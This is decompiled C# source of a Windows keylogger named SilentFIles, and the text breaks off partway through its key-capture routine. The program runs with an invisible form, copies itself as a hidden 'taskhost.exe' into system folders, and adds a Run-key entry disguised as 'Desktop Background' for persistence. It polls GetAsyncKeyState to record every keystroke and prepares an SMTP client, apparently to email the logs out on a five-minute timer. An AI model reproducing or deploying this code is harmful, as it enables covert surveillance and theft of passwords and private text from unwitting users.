using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SilentFIles.My;

namespace SilentFIles;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TxtKeys")]
	private TextBox _TxtKeys;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	private SmtpClient SmtpServer;

	private MailMessage mail;

	private string AppName;

	private MemoryStream MemStream;

	internal virtual TextBox TxtKeys
	{
		[DebuggerNonUserCode]
		get
		{
			return _TxtKeys;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TxtKeys = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick_1;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		SmtpServer = new SmtpClient();
		mail = new MailMessage();
		AppName = "\\taskhost.exe";
		MemStream = new MemoryStream();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TxtKeys = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		((Control)this).SuspendLayout();
		((TextBoxBase)TxtKeys).set_BackColor(SystemColors.ButtonShadow);
		((TextBoxBase)TxtKeys).set_BorderStyle((BorderStyle)0);
		componentResourceManager.ApplyResources(TxtKeys, "TxtKeys");
		((Control)TxtKeys).set_Name("TxtKeys");
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(300000);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)0);
		componentResourceManager.ApplyResources(this, "$this");
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TxtKeys);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetKeyState(int nVirtKey);

	private void Form1_Load(object sender, EventArgs e)
	{
		Version version = Environment.OSVersion.Version;
		if (version.Major == 5)
		{
			CopyFile("C:\\Windows\\System32");
		}
		if (version.Major == 6)
		{
			CopyFile("C:\\ProgramData");
		}
		((Form)this).set_ShowInTaskbar(false);
	}

	public void RunAtStartup(string ApplicationName, string ApplicationPath)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		RegistryKey registryKey2 = registryKey;
		registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey2.SetValue(ApplicationName, ApplicationPath);
		registryKey2 = null;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void CopyFile(string Path)
	{
		string path = Path + AppName;
		if (!File.Exists(path))
		{
			RunAtStartup("Desktop Background", Path + AppName);
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Path + AppName);
			File.SetAttributes(Path + AppName, FileAttributes.Hidden);
			Interaction.Shell(Path + AppName, (AppWinStyle)0, false, -1);
		}
		if (Operators.CompareString(Path + AppName, Application.get_ExecutablePath(), false) != 0)
		{
			ProjectData.EndApp();
		}
	}

	private bool getCapslock()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 54:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				flag = (GetKeyState(20) & 1) != 0;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 54;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private bool getShift()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 52:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				flag = GetAsyncKeyState(16) != 0;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 52;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		object obj2 = default(object);
		object obj3 = default(object);
		int length = default(int);
		object obj4 = default(object);
		object obj5 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 5325:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_000d;
						case 4:
							goto IL_0016;
						case 5:
							goto IL_0027;
						case 6:
							goto IL_003e;
						case 8:
						case 9:
							goto IL_004c;
						case 10:
							goto IL_005d;
						case 11:
							goto IL_0075;
						case 12:
							goto IL_0091;
						case 13:
							goto IL_00a6;
						case 16:
						case 17:
							goto IL_00ce;
						case 18:
							goto IL_00e0;
						case 19:
							goto IL_00f8;
						case 21:
						case 22:
							goto IL_0107;
						case 23:
							goto IL_011c;
						case 24:
							goto IL_0134;
						case 25:
							goto IL_0143;
						case 27:
							goto IL_0152;
						case 28:
							goto IL_0156;
						case 31:
						case 32:
							goto IL_0165;
						case 33:
							goto IL_017a;
						case 34:
							goto IL_0192;
						case 35:
							goto IL_01a1;
						case 37:
							goto IL_01b0;
						case 38:
							goto IL_01b4;
						case 41:
						case 42:
							goto IL_01c3;
						case 43:
							goto IL_01d8;
						case 44:
							goto IL_01f0;
						case 45:
							goto IL_01ff;
						case 47:
							goto IL_020e;
						case 48:
							goto IL_0212;
						case 51:
						case 52:
							goto IL_0221;
						case 53:
							goto IL_0236;
						case 54:
							goto IL_024e;
						case 55:
							goto IL_025d;
						case 57:
							goto IL_026c;
						case 58:
							goto IL_0270;
						case 61:
						case 62:
							goto IL_027f;
						case 63:
							goto IL_0294;
						case 64:
							goto IL_02ac;
						case 65:
							goto IL_02bb;
						case 67:
							goto IL_02ca;
						case 68:
							goto IL_02ce;
						case 71:
						case 72:
							goto IL_02dd;
						case 73:
							goto IL_02f2;
						case 74:
							goto IL_030a;
						case 75:
							goto IL_0319;
						case 77:
							goto IL_0328;
						case 78:
							goto IL_032c;
						case 81:
						case 82:
							goto IL_033b;
						case 83:
							goto IL_0350;
						case 84:
							goto IL_0368;
						case 85:
							goto IL_0377;
						case 87:
							goto IL_0386;
						case 88:
							goto IL_038a;
						case 91:
						case 92:
							goto IL_0399;
						case 93:
							goto IL_03ab;
						case 94:
							goto IL_03c3;
						case 95:
							goto IL_03d2;
						case 97:
							goto IL_03e1;
						case 98:
							goto IL_03e5;
						case 101:
						case 102:
							goto IL_03f4;
						case 103:
							goto IL_0406;
						case 104:
							goto IL_041e;
						case 105:
							goto IL_042d;
						case 107:
							goto IL_043c;
						case 108:
							goto IL_0440;
						case 111:
						case 112:
							goto IL_044f;
						case 113:
							goto IL_0461;
						case 114:
							goto IL_0479;
						case 115:
							goto IL_0488;
						case 117:
							goto IL_0497;
						case 118:
							goto IL_049b;
						case 121:
						case 122:
							goto IL_04aa;
						case 123:
							goto IL_04bc;
						case 124:
							goto IL_04d4;
						case 125:
							goto IL_04e3;
						case 127:
							goto IL_04f2;
						case 128:
							goto IL_04f6;
						case 131:
						case 132:
							goto IL_0508;
						case 133:
							goto IL_051d;
						case 134:
							goto IL_0538;
						case 135:
							goto IL_054a;
						case 137:
							goto IL_055c;
						case 138:
							goto IL_0563;
						case 141:
						case 142:
							goto IL_0575;
						case 143:
							goto IL_058a;
						case 144:
							goto IL_05a5;
						case 145:
							goto IL_05b7;
						case 147:
							goto IL_05c9;
						case 148:
							goto IL_05d0;
						case 151:
						case 152:
							goto IL_05e2;
						case 153:
							goto IL_05f7;
						case 154:
							goto IL_0612;
						case 155:
							goto IL_0624;
						case 157:
							goto IL_0636;
						case 158:
							goto IL_063d;
						case 161:
						case 162:
							goto IL_064f;
						case 163:
							goto IL_0664;
						case 164:
							goto IL_067f;
						case 165:
							goto IL_0691;
						case 167:
							goto IL_06a3;
						case 168:
							goto IL_06aa;
						case 171:
						case 172:
							goto IL_06bc;
						case 173:
							goto IL_06d1;
						case 174:
							goto IL_06ec;
						case 175:
							goto IL_06fe;
						case 177:
							goto IL_0710;
						case 178:
							goto IL_0717;
						case 181:
						case 182:
							goto IL_0729;
						case 183:
							goto IL_073e;
						case 184:
							goto IL_0759;
						case 185:
							goto IL_076b;
						case 187:
							goto IL_077d;
						case 188:
							goto IL_0784;
						case 191:
						case 192:
							goto IL_0796;
						case 193:
							goto IL_07ab;
						case 194:
							goto IL_07c6;
						case 195:
							goto IL_07d8;
						case 197:
							goto IL_07ea;
						case 198:
							goto IL_07f1;
						case 201:
						case 202:
							goto IL_0803;
						case 203:
							goto IL_0818;
						case 204:
							goto IL_0833;
						case 205:
							goto IL_0845;
						case 207:
							goto IL_0857;
						case 208:
							goto IL_085e;
						case 211:
						case 212:
							goto IL_0870;
						case 213:
							goto IL_0885;
						case 214:
							goto IL_08a0;
						case 216:
						case 217:
							goto IL_08b2;
						case 218:
							goto IL_08c7;
						case 219:
							goto IL_08e2;
						case 220:
							goto IL_08f4;
						case 222:
							goto IL_0906;
						case 223:
							goto IL_090d;
						case 226:
						case 227:
							goto IL_091f;
						case 228:
							goto IL_0934;
						case 229:
							goto IL_094f;
						case 230:
							goto IL_0961;
						case 232:
							goto IL_0973;
						case 233:
							goto IL_097a;
						case 236:
						case 237:
							goto IL_098c;
						case 238:
							goto IL_09a1;
						case 239:
							goto IL_09bc;
						case 241:
						case 242:
							goto IL_09ce;
						case 243:
							goto IL_09e2;
						case 244:
							goto IL_09fd;
						case 245:
							goto IL_0a0f;
						case 247:
							goto IL_0a21;
						case 248:
							goto IL_0a28;
						case 251:
						case 252:
							goto IL_0a3a;
						case 253:
							goto IL_0a52;
						case 254:
							goto IL_0a6d;
						case 255:
							goto IL_0a7f;
						case 257:
							goto IL_0a91;
						case 258:
							goto IL_0a98;
						case 261:
						case 262:
							goto IL_0aaa;
						case 263:
							goto IL_0ac2;
						case 264:
							goto IL_0add;
						case 265:
							goto IL_0aef;
						case 267:
							goto IL_0b01;
						case 268:
							goto IL_0b08;
						case 271:
						case 272:
							goto IL_0b1c;
						case 273:
							goto IL_0b34;
						case 274:
							goto IL_0b4f;
						case 275:
							goto IL_0b61;
						case 277:
							goto IL_0b73;
						case 278:
							goto IL_0b7a;
						case 281:
						case 282:
							goto IL_0b8c;
						case 283:
							goto IL_0ba4;
						case 284:
							goto IL_0bbf;
						case 285:
							goto IL_0bd1;
						case 287:
							goto IL_0be3;
						case 288:
							goto IL_0bea;
						case 291:
						case 292:
							goto IL_0bfc;
						case 294:
							goto IL_0c2b;
						case 312:
						case 313:
							goto IL_0c46;
						case 293:
							goto IL_0c5c;
						case 295:
							goto IL_0c77;
						case 296:
							goto IL_0c89;
						case 297:
							goto IL_0c98;
						case 299:
							goto IL_0cba;
						case 300:
							goto IL_0cc1;
						case 303:
							goto IL_0ce3;
						case 304:
							goto IL_0cea;
						case 305:
							goto IL_0cfc;
						case 307:
							goto IL_0d1e;
						case 308:
							goto IL_0d25;
						case 314:
							goto IL_0d47;
						case 316:
							goto IL_0d73;
						case 356:
						case 357:
							goto IL_0d8e;
						case 315:
							goto IL_0da4;
						case 317:
							goto IL_0dbf;
						case 318:
							goto IL_0dd1;
						case 348:
						case 349:
							goto IL_0e1e;
						case 320:
						case 322:
							goto IL_0e30;
						case 324:
						case 325:
							goto IL_0e42;
						case 327:
						case 328:
							goto IL_0e54;
						case 330:
						case 331:
							goto IL_0e63;
						case 333:
						case 334:
							goto IL_0e72;
						case 336:
						case 337:
							goto IL_0e81;
						case 339:
						case 340:
							goto IL_0e90;
						case 342:
						case 343:
							goto IL_0e9f;
						case 345:
						case 346:
							goto IL_0eae;
						case 352:
							goto IL_0ebd;
						case 353:
							goto IL_0ec4;
						case 7:
						case 14:
						case 15:
						case 20:
						case 26:
						case 29:
						case 30:
						case 36:
						case 39:
						case 40:
						case 46:
						case 49:
						case 50:
						case 56:
						case 59:
						case 60:
						case 66:
						case 69:
						case 70:
						case 76:
						case 79:
						case 80:
						case 86:
						case 89:
						case 90:
						case 96:
						case 99:
						case 100:
						case 106:
						case 109:
						case 110:
						case 116:
						case 119:
						case 120:
						case 126:
						case 129:
						case 130:
						case 136:
						case 139:
						case 140:
						case 146:
						case 149:
						case 150:
						case 156:
						case 159:
						case 160:
						case 166:
						case 169:
						case 170:
						case 176:
						case 179:
						case 180:
						case 186:
						case 189:
						case 190:
						case 196:
						case 199:
						case 200:
						case 206:
						case 209:
						case 210:
						case 215:
						case 221:
						case 224:
						case 225:
						case 231:
						case 234:
						case 235:
						case 240:
						case 246:
						case 249:
						case 250:
						case 256:
						case 259:
						case 260:
						case 266:
						case 269:
						case 270:
						case 276:
						case 279:
						case 280:
						case 286:
						case 289:
						case 290:
						case 298:
						case 301:
						case 302:
						case 306:
						case 309:
						case 310:
						case 311:
						case 319:
						case 323:
						case 326:
						case 329:
						case 332:
						case 335:
						case 338:
						case 341:
						case 344:
						case 347:
						case 350:
						case 351:
						case 354:
						case 355:
						case 359:
							goto IL_0edc;
						case 360:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 358:
						case 361:
						case 362:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0edc:
					num = 359;
					if (!Operators.ConditionalCompareObjectNotEqual(obj, (object)"", false))
					{
						goto end_IL_0001_3;
					}
					break;
					IL_0ec4:
					num = 353;
					obj = Strings.Chr(Conversions.ToInteger(obj2));
					goto IL_0edc;
					IL_000a:
					num = 2;
					goto IL_000d;
					IL_000d:
					ProjectData.ClearProjectError();
					num3 = -3;
					goto IL_0016;
					IL_0016:
					num = 4;
					obj3 = GetAsyncKeyState(13);
					goto IL_0027;
					IL_0027:
					num = 5;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_003e;
					}
					goto IL_004c;
					IL_003e:
					num = 6;
					obj = Environment.NewLine;
					goto IL_0edc;
					IL_004c:
					num = 9;
					obj3 = GetAsyncKeyState(8);
					goto IL_005d;
					IL_005d:
					num = 10;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0075;
					}
					goto IL_00ce;
					IL_0075:
					num = 11;
					if (TxtKeys.get_Text().Length > 0)
					{
						goto IL_0091;
					}
					goto IL_0edc;
					IL_0091:
					num = 12;
					length = TxtKeys.get_Text().Length;
					goto IL_00a6;
					IL_00a6:
					num = 13;
					TxtKeys.set_Text(TxtKeys.get_Text().Remove(checked(length - 1), 1));
					goto IL_0edc;
					IL_00ce:
					num = 17;
					obj3 = GetAsyncKeyState(32);
					goto IL_00e0;
					IL_00e0:
					num = 18;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_00f8;
					}
					goto IL_0107;
					IL_00f8:
					num = 19;
					obj = " ";
					goto IL_0edc;
					IL_0107:
					num = 22;
					obj3 = GetAsyncKeyState(186);
					goto IL_011c;
					IL_011c:
					num = 23;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0134;
					}
					goto IL_0165;
					IL_0134:
					num = 24;
					if (!getShift())
					{
						goto IL_0143;
					}
					goto IL_0152;
					IL_0143:
					num = 25;
					obj = ";";
					goto IL_0edc;
					IL_0152:
					num = 27;
					goto IL_0156;
					IL_0156:
					num = 28;
					obj = ":";
					goto IL_0edc;
					IL_0165:
					num = 32;
					obj3 = GetAsyncKeyState(187);
					goto IL_017a;
					IL_017a:
					num = 33;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0192;
					}
					goto IL_01c3;
					IL_0192:
					num = 34;
					if (!getShift())
					{
						goto IL_01a1;
					}
					goto IL_01b0;
					IL_01a1:
					num = 35;
					obj = "=";
					goto IL_0edc;
					IL_01b0:
					num = 37;
					goto IL_01b4;
					IL_01b4:
					num = 38;
					obj = "+";
					goto IL_0edc;
					IL_01c3:
					num = 42;
					obj3 = GetAsyncKeyState(188);
					goto IL_01d8;
					IL_01d8:
					num = 43;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_01f0;
					}
					goto IL_0221;
					IL_01f0:
					num = 44;
					if (!getShift())
					{
						goto IL_01ff;
					}
					goto IL_020e;
					IL_01ff:
					num = 45;
					obj = ",";
					goto IL_0edc;
					IL_020e:
					num = 47;
					goto IL_0212;
					IL_0212:
					num = 48;
					obj = "<";
					goto IL_0edc;
					IL_0221:
					num = 52;
					obj3 = GetAsyncKeyState(189);
					goto IL_0236;
					IL_0236:
					num = 53;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_024e;
					}
					goto IL_027f;
					IL_024e:
					num = 54;
					if (!getShift())
					{
						goto IL_025d;
					}
					goto IL_026c;
					IL_025d:
					num = 55;
					obj = "-";
					goto IL_0edc;
					IL_026c:
					num = 57;
					goto IL_0270;
					IL_0270:
					num = 58;
					obj = "_";
					goto IL_0edc;
					IL_027f:
					num = 62;
					obj3 = GetAsyncKeyState(190);
					goto IL_0294;
					IL_0294:
					num = 63;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_02ac;
					}
					goto IL_02dd;
					IL_02ac:
					num = 64;
					if (!getShift())
					{
						goto IL_02bb;
					}
					goto IL_02ca;
					IL_02bb:
					num = 65;
					obj = ".";
					goto IL_0edc;
					IL_02ca:
					num = 67;
					goto IL_02ce;
					IL_02ce:
					num = 68;
					obj = ">";
					goto IL_0edc;
					IL_02dd:
					num = 72;
					obj3 = GetAsyncKeyState(191);
					goto IL_02f2;
					IL_02f2:
					num = 73;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_030a;
					}
					goto IL_033b;
					IL_030a:
					num = 74;
					if (!getShift())
					{
						goto IL_0319;
					}
					goto IL_0328;
					IL_0319:
					num = 75;
					obj = "/";
					goto IL_0edc;
					IL_0328:
					num = 77;
					goto IL_032c;
					IL_032c:
					num = 78;
					obj = "?";
					goto IL_0edc;
					IL_033b:
					num = 82;
					obj3 = GetAsyncKeyState(192);
					goto IL_0350;
					IL_0350:
					num = 83;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0368;
					}
					goto IL_0399;
					IL_0368:
					num = 84;
					if (!getShift())
					{
						goto IL_0377;
					}
					goto IL_0386;
					IL_0377:
					num = 85;
					obj = "`";
					goto IL_0edc;
					IL_0386:
					num = 87;
					goto IL_038a;
					IL_038a:
					num = 88;
					obj = "~";
					goto IL_0edc;
					IL_0399:
					num = 92;
					obj3 = GetAsyncKeyState(96);
					goto IL_03ab;
					IL_03ab:
					num = 93;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_03c3;
					}
					goto IL_03f4;
					IL_03c3:
					num = 94;
					if (!getShift())
					{
						goto IL_03d2;
					}
					goto IL_03e1;
					IL_03d2:
					num = 95;
					obj = "0";
					goto IL_0edc;
					IL_03e1:
					num = 97;
					goto IL_03e5;
					IL_03e5:
					num = 98;
					obj = ")";
					goto IL_0edc;
					IL_03f4:
					num = 102;
					obj3 = GetAsyncKeyState(97);
					goto IL_0406;
					IL_0406:
					num = 103;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_041e;
					}
					goto IL_044f;
					IL_041e:
					num = 104;
					if (!getShift())
					{
						goto IL_042d;
					}
					goto IL_043c;
					IL_042d:
					num = 105;
					obj = "1";
					goto IL_0edc;
					IL_043c:
					num = 107;
					goto IL_0440;
					IL_0440:
					num = 108;
					obj = "!";
					goto IL_0edc;
					IL_044f:
					num = 112;
					obj3 = GetAsyncKeyState(98);
					goto IL_0461;
					IL_0461:
					num = 113;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0479;
					}
					goto IL_04aa;
					IL_0479:
					num = 114;
					if (!getShift())
					{
						goto IL_0488;
					}
					goto IL_0497;
					IL_0488:
					num = 115;
					obj = "2";
					goto IL_0edc;
					IL_0497:
					num = 117;
					goto IL_049b;
					IL_049b:
					num = 118;
					obj = "@";
					goto IL_0edc;
					IL_04aa:
					num = 122;
					obj3 = GetAsyncKeyState(99);
					goto IL_04bc;
					IL_04bc:
					num = 123;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_04d4;
					}
					goto IL_0508;
					IL_04d4:
					num = 124;
					if (!getShift())
					{
						goto IL_04e3;
					}
					goto IL_04f2;
					IL_04e3:
					num = 125;
					obj = "3";
					goto IL_0edc;
					IL_04f2:
					num = 127;
					goto IL_04f6;
					IL_04f6:
					num = 128;
					obj = "#";
					goto IL_0edc;
					IL_0508:
					num = 132;
					obj3 = GetAsyncKeyState(100);
					goto IL_051d;
					IL_051d:
					num = 133;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0538;
					}
					goto IL_0575;
					IL_0538:
					num = 134;
					if (!getShift())
					{
						goto IL_054a;
					}
					goto IL_055c;
					IL_054a:
					num = 135;
					obj = "4";
					goto IL_0edc;
					IL_055c:
					num = 137;
					goto IL_0563;
					IL_0563:
					num = 138;
					obj = "$";
					goto IL_0edc;
					IL_0575:
					num = 142;
					obj3 = GetAsyncKeyState(101);
					goto IL_058a;
					IL_058a:
					num = 143;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_05a5;
					}
					goto IL_05e2;
					IL_05a5:
					num = 144;
					if (!getShift())
					{
						goto IL_05b7;
					}
					goto IL_05c9;
					IL_05b7:
					num = 145;
					obj = "5";
					goto IL_0edc;
					IL_05c9:
					num = 147;
					goto IL_05d0;
					IL_05d0:
					num = 148;
					obj = "%";
					goto IL_0edc;
					IL_05e2:
					num = 152;
					obj3 = GetAsyncKeyState(102);
					goto IL_05f7;
					IL_05f7:
					num = 153;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0612;
					}
					goto IL_064f;
					IL_0612:
					num = 154;
					if (!getShift())
					{
						goto IL_0624;
					}
					goto IL_0636;
					IL_0624:
					num = 155;
					obj = "6";
					goto IL_0edc;
					IL_0636:
					num = 157;
					goto IL_063d;
					IL_063d:
					num = 158;
					obj = "7";
					goto IL_0edc;
					IL_064f:
					num = 162;
					obj3 = GetAsyncKeyState(103);
					goto IL_0664;
					IL_0664:
					num = 163;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_067f;
					}
					goto IL_06bc;
					IL_067f:
					num = 164;
					if (!getShift())
					{
						goto IL_0691;
					}
					goto IL_06a3;
					IL_0691:
					num = 165;
					obj = "7";
					goto IL_0edc;
					IL_06a3:
					num = 167;
					goto IL_06aa;
					IL_06aa:
					num = 168;
					obj = "&";
					goto IL_0edc;
					IL_06bc:
					num = 172;
					obj3 = GetAsyncKeyState(104);
					goto IL_06d1;
					IL_06d1:
					num = 173;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_06ec;
					}
					goto IL_0729;
					IL_06ec:
					num = 174;
					if (!getShift())
					{
						goto IL_06fe;
					}
					goto IL_0710;
					IL_06fe:
					num = 175;
					obj = "8";
					goto IL_0edc;
					IL_0710:
					num = 177;
					goto IL_0717;
					IL_0717:
					num = 178;
					obj = "*";
					goto IL_0edc;
					IL_0729:
					num = 182;
					obj3 = GetAsyncKeyState(105);
					goto IL_073e;
					IL_073e:
					num = 183;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0759;
					}
					goto IL_0796;
					IL_0759:
					num = 184;
					if (!getShift())
					{
						goto IL_076b;
					}
					goto IL_077d;
					IL_076b:
					num = 185;
					obj = "9";
					goto IL_0edc;
					IL_077d:
					num = 187;
					goto IL_0784;
					IL_0784:
					num = 188;
					obj = "(";
					goto IL_0edc;
					IL_0796:
					num = 192;
					obj3 = GetAsyncKeyState(106);
					goto IL_07ab;
					IL_07ab:
					num = 193;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_07c6;
					}
					goto IL_0803;
					IL_07c6:
					num = 194;
					if (!getShift())
					{
						goto IL_07d8;
					}
					goto IL_07ea;
					IL_07d8:
					num = 195;
					obj = "*";
					goto IL_0edc;
					IL_07ea:
					num = 197;
					goto IL_07f1;
					IL_07f1:
					num = 198;
					obj = "";
					goto IL_0edc;
					IL_0803:
					num = 202;
					obj3 = GetAsyncKeyState(107);
					goto IL_0818;
					IL_0818:
					num = 203;
					if (Operators.ConditionalCompareObjectEqual(obj3, (object)(-32767), false))
					{
						goto IL_0833;
					}
					goto IL_0870;
					IL_0833:
					num = 204;
					if (!getShift())
					{
						goto IL_0845;
					}
					goto IL_0857;
					IL_0845:
